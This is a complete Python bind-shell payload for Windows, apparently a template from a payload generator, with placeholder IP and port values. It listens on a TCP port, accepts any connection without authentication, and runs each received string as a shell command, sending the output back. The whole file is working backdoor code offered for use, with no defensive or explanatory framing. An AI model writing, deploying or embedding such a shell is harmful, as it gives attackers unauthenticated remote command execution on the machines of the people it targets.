import socket
import subprocess
import os
IP = "$ip"
PORT = "$port"
def win_bind_shell(IP,PORT):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.bind((IP,int(PORT)))
    sock.listen(1)
    while True:
        try:
            conn,addr = sock.accept()
            while True:
                try:
                    command = conn.recv(1024).decode('utf-8')
                except (BrokenPipeError,ConnectionResetError):
                    break
                if command.lower() == 'exit':
                    break
                cleaned_command = command.strip()
                if cleaned_command == 'cd' or cleaned_command.startswith("cd "):
                    try:
                        if cleaned_command == 'cd':
                            path = os.path.expanduser("~")
                        else:
                            path = cleaned_command[3:].strip()
                        os.chdir(path)
                        responce = f"[+] Changed directory to {os.getcwd()}\n"
                    except Exception as e:
                        responce = f"Error: str({e})"
                    conn.send(responce.encode("cp866"))
                    continue
                output = subprocess.run(command,shell=True,capture_output=True,text=True)
                responce = output.stdout + output.stderr
                if not responce:
                    responce = '\n'
                conn.send(responce.encode('cp866'))
        except Exception:
            continue
    sock.close()
win_bind_shell(IP,PORT)